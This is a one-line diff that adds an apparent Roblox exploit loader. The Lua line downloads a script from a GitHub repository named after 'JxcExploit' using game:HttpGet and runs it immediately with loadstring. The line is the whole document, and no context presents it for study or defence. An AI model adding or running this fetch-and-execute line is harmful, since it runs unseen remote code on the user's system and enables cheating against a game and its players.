@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/JxcExploit/car-crash-driving/main/op')))()
